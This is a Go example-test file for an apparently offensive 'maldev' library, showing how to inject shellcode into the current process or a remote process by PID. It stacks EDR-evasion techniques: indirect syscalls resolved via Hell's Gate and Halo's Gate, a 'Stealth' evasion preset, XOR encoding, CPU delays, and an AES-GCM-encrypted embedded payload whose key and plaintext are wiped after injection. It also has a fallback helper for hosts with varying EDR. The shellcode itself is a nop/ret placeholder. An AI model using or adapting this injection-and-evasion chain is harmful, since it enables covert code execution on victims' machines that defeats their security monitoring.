package inject_test

import (
	"github.com/oioio-space/maldev/cleanup/memory"
	"github.com/oioio-space/maldev/crypto"
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
	"github.com/oioio-space/maldev/inject"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Self-inject via CreateThread — the most common single-process flow.
// `cfg.PID = 0` selects the current process; the injector type-asserts to
// SelfInjector so the freshly-allocated region is recoverable for sleep
// masking or wiping.
func ExampleNewWindowsInjector() {
	shellcode := []byte{0x90, 0x90, 0xC3} // nop; nop; ret — placeholder

	cfg := inject.DefaultWindowsConfig(inject.MethodCreateThread, 0)
	inj, err := inject.NewWindowsInjector(cfg)
	if err != nil {
		return
	}
	if err := inj.Inject(shellcode); err != nil {
		return
	}

	if self, ok := inj.(inject.SelfInjector); ok {
		if r, ok := self.InjectedRegion(); ok {
			_ = r // pass to evasion/sleepmask or cleanup/memory
		}
	}
}

// Build pattern — fluent construction with indirect syscalls, CPU
// delay, and XOR encoding stacked as middleware.
func ExampleBuild() {
	shellcode := []byte{0x90, 0x90, 0xC3}

	inj, err := inject.Build().
		Method(inject.MethodCreateRemoteThread).
		TargetPID(1234).
		IndirectSyscalls().
		Use(inject.WithCPUDelayConfig(inject.CPUDelayConfig{MaxIterations: 10_000_000})).
		Use(inject.WithXORKey(0x41)).
		Create()
	if err != nil {
		return
	}
	_ = inj.Inject(shellcode)
}

// Pipeline pattern — separate the memory setup from the execution
// trigger. Pipelines compose any [MemorySetup] with any [Executor],
// allowing exotic combinations the named methods do not cover.
func ExamplePipeline() {
	// Sketch only: the actual MemorySetup / Executor implementations
	// require a process handle; see inject/pipeline.go for concrete
	// constructors (RemoteMemory, CreateRemoteThreadExecutor).
	var mem inject.MemorySetup
	var exec inject.Executor

	if mem == nil || exec == nil {
		return // demo only
	}

	p := inject.NewPipeline(mem, exec)
	_ = p.Inject([]byte{0x90, 0xC3})
}

// Composed example — apply evasion, decrypt the payload, wipe the
// key, inject through indirect syscalls, wipe the plaintext.
func ExampleNewWindowsInjector_chain() {
	caller := wsyscall.New(wsyscall.MethodIndirect,
		wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()))
	_ = evasion.ApplyAll(preset.Stealth(), caller)

	var encrypted, key []byte // //go:embed at build time

	shellcode, err := crypto.DecryptAESGCM(key, encrypted)
	if err != nil {
		return
	}
	memory.SecureZero(key)

	inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
		Config:        inject.Config{Method: inject.MethodCreateThread},
		SyscallMethod: wsyscall.MethodIndirect,
	})
	if err != nil {
		return
	}
	if err := inj.Inject(shellcode); err != nil {
		return
	}
	memory.SecureZero(shellcode)
}

// InjectWithFallback tries alternate methods if the primary fails —
// useful when a target's EDR posture varies across hosts.
func ExampleInjectWithFallback() {
	cfg := &inject.Config{
		Method:   inject.MethodCreateRemoteThread,
		PID:      4242,
		Fallback: true,
	}
	_ = inject.InjectWithFallback(cfg, []byte{0x90, 0xC3})
}
